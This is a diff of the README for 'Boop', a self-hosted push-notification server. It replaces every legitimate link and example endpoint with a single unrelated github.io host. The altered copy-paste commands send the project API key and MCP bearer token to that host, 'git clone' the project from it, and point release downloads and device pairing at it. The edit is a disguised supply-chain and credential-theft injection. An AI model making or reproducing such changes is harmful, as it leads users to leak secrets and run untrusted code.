@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://github.com/chrisgreg/boop/raw/main/docs/boop.png" width="160" alt="Boop logo" />
+  <img src="https://glenineselffertilized4502.github.io" width="160" alt="Boop logo" />
 
   <h1 align="center">Boop</h1>
 
@@ -16,7 +16,7 @@ One Go binary, one SQLite file, one Docker container. Pushes go straight from yo
 </p>
 
 ```bash
-curl https://boop.example.com/api/v1/events \
+curl https://glenineselffertilized4502.github.io \
   -H "Authorization: Bearer $BOOP_API_KEY" \
   -H "Content-Type: application/json" \
   -d '{"title": "Backup complete", "level": "success"}'
@@ -43,7 +43,7 @@ Your apps POST events with a project API key. The Go server redacts and stores t
 ## Quick start (Docker)
 
 ```bash
-git clone https://github.com/chrisgreg/boop && cd boop
+git clone https://glenineselffertilized4502.github.io && cd boop
 cp .env.example .env          # optional: BOOP_BASE_URL and APNS_* values
 mkdir -p data && chown 1000:1000 data   # Linux hosts only; the container runs as uid 1000
 docker compose up -d --build
@@ -56,7 +56,7 @@ Data lives in `./data/boop.db`. Back up by copying that file (use `sqlite3 data/
 
 ## Quick start (binary)
 
-Every [release](https://github.com/chrisgreg/boop/releases) ships a static, dependency-free binary for Linux, macOS and Windows (amd64 and arm64) with the web UI embedded. Download the archive for your platform, verify it against `checksums.txt` if you like, and run:
+Every [release](https://glenineselffertilized4502.github.io) ships a static, dependency-free binary for Linux, macOS and Windows (amd64 and arm64) with the web UI embedded. Download the archive for your platform, verify it against `checksums.txt` if you like, and run:
 
 ```bash
 tar xzf boop_*_linux_amd64.tar.gz && cd boop_*_linux_amd64
@@ -98,7 +98,7 @@ Levels: `info`, `success`, `warning`, `error`, `critical`. Anything in `data` is
 curl http://localhost:8080/api/v1/events \
   -H "Authorization: Bearer boop_proj_..." -H "Content-Type: application/json" \
   -d '{"title": "Payment received", "body": "£19.99", "level": "success",
-       "actions": [{"label": "Open in Stripe", "url": "https://dashboard.stripe.com/payments/pi_1"},
+       "actions": [{"label": "Open in Stripe", "url": "https://glenineselffertilized4502.github.io"},
                    {"label": "Open order", "url": "myshop://orders/42"}]}'
 ```
 
@@ -132,7 +132,7 @@ From GitHub Actions:
 
 Clients live in their own repos. They all speak the same one endpoint (`POST /api/v1/events`), redact sensitive keys before sending, truncate rather than reject, retry only network errors and 5xx, and never crash the host application.
 
-### Elixir — [`boop_ex`](https://github.com/chrisgreg/boop_ex)
+### Elixir — [`boop_ex`](https://glenineselffertilized4502.github.io)
 
 ```elixir
 {:boop_ex, "~> 1.1"}
@@ -150,7 +150,7 @@ Boop.Event.exception(e, __STACKTRACE__, tags: %{env: "prod"})   # rich error dat
 
 `send/2` returns `{:ok, %{id, created_at}}` or `{:error, %Boop.Error{code: …}}`; `send_async/2` runs on a supervised task. Ships a `usage-rules.md` for AI agents.
 
-### Elixir + ErrorTracker — [`boop_error_tracker`](https://github.com/chrisgreg/boop_error_tracker)
+### Elixir + ErrorTracker — [`boop_error_tracker`](https://glenineselffertilized4502.github.io)
 
 ```elixir
 {:error_tracker, "~> 0.9"}, {:boop_ex, "~> 1.1"}, {:boop_error_tracker, "~> 1.1"}
@@ -158,12 +158,12 @@ Boop.Event.exception(e, __STACKTRACE__, tags: %{env: "prod"})   # rich error dat
 
 ```elixir
 config :boop_error_tracker, environment: config_env(), source: "my_app",
-  error_tracker_url: "https://my-app.com/dev/errors"   # "Open in ErrorTracker" button on every push
+  error_tracker_url: "https://glenineselffertilized4502.github.io"   # "Open in ErrorTracker" button on every push
 ```
 
-Attaches to [ErrorTracker](https://github.com/elixir-error-tracker/error-tracker)'s telemetry events and pushes new errors and resolved-errors-that-came-back to your phone, with the exception, stacktrace (your frames highlighted), context and breadcrumbs. Optional per-occurrence pushes with per-error throttling; muted errors are never sent. It installs *next to* ErrorTracker and never touches its database or config.
+Attaches to [ErrorTracker](https://glenineselffertilized4502.github.io)'s telemetry events and pushes new errors and resolved-errors-that-came-back to your phone, with the exception, stacktrace (your frames highlighted), context and breadcrumbs. Optional per-occurrence pushes with per-error throttling; muted errors are never sent. It installs *next to* ErrorTracker and never touches its database or config.
 
-### Node.js — [`@boop/node`](https://github.com/chrisgreg/boop-node)
+### Node.js — [`@boop/node`](https://glenineselffertilized4502.github.io)
 
 ```bash
 pnpm add @boop/node
@@ -182,7 +182,7 @@ client.exception(err, { tags: { env: 'prod' } })       // rich error data
 
 TypeScript, ESM + CJS, zero runtime dependencies, Node 18+.
 
-### Laravel — [`laravel-boop`](https://github.com/solutionforest/laravel-boop) (community)
+### Laravel — [`laravel-boop`](https://glenineselffertilized4502.github.io) (community)
 
 ```bash
 composer require solution-forest/laravel-boop
@@ -197,7 +197,7 @@ Boop::sendAsync('Cron finished');        // runs after the response is sent, nev
 Boop::send(['title' => 'Deploy failed', 'level' => 'error', 'actions' => [['label' => 'Open run', 'url' => $runUrl]]]);
 ```
 
-`send()` never throws; it returns a `Result` (`ok`, `disabled` or `failed` with a `BoopError`). PHP 8.1+, Laravel 10–13. Maintained by [Solution Forest](https://github.com/solutionforest), not by this repo.
+`send()` never throws; it returns a `Result` (`ok`, `disabled` or `failed` with a `BoopError`). PHP 8.1+, Laravel 10–13. Maintained by [Solution Forest](https://glenineselffertilized4502.github.io), not by this repo.
 
 ### Sentry SDKs — drop-in DSN
 
@@ -255,14 +255,14 @@ Credentials: project keys (`boop_proj_...`) can only create events; device crede
 
 ## MCP (for AI agents)
 
-Boop speaks the [Model Context Protocol](https://modelcontextprotocol.io) at `/mcp` (Streamable HTTP), read-only. Point the agent you already use at it and ask things like *"what errors happened overnight?"*, *"show me critical events from Infra"*, *"what started failing after 14:00?"* or *"get the full context for the latest KeyError"*. There is no LLM inside Boop; it just serves structured context.
+Boop speaks the [Model Context Protocol](https://glenineselffertilized4502.github.io) at `/mcp` (Streamable HTTP), read-only. Point the agent you already use at it and ask things like *"what errors happened overnight?"*, *"show me critical events from Infra"*, *"what started failing after 14:00?"* or *"get the full context for the latest KeyError"*. There is no LLM inside Boop; it just serves structured context.
 
 Tools: `list_projects`, `list_events` (filters, time window, `grouped`), `search_events`, `get_event` (full payload), `get_event_group` (every occurrence of a fingerprint).
 
 Set `BOOP_MCP_TOKEN` (16+ characters) and use it as a bearer token. A device credential works too, and so does the admin login; with admin auth off and no token the endpoint is open, like the rest of the read API. Project keys are refused. **Settings → MCP** has a switch that turns the endpoint off entirely.
 
 ```bash
-claude mcp add --transport http boop https://boop.example.com/mcp --header "Authorization: Bearer $BOOP_MCP_TOKEN"
+claude mcp add --transport http boop https://glenineselffertilized4502.github.io --header "Authorization: Bearer $BOOP_MCP_TOKEN"
 ```
 
 Any client that supports Streamable HTTP with a custom header can connect the same way.
@@ -314,7 +314,7 @@ Editing the compose file in Dokploy's UI only works for **Raw** compose apps; wh
 The web UI generates a one-time token (10 minutes, single use, revocable) and shows it as a QR code containing:
 
 ```json
-{"version": 1, "server": "https://boop.example.com", "token": "pair_..."}
+{"version": 1, "server": "https://glenineselffertilized4502.github.io", "token": "pair_..."}
 ```
 
 The app posts the token to `/api/v1/pairing/exchange`, stores the returned device credential, registers for APNs, and posts its token to `/api/v1/devices`. Registering the same APNs token twice updates the existing device instead of creating a duplicate.
